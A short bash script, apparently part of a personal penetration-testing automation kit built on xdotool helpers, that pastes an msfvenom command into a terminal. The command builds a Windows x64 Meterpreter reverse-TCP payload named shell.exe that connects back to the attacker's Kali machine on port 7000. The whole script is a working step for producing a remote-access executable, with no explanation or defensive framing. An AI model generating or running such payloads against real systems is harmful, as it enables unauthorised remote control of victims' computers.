#!/bin/bash

: '
Create EXE file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

paste_command "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=7000 -f exe -o shell.exe"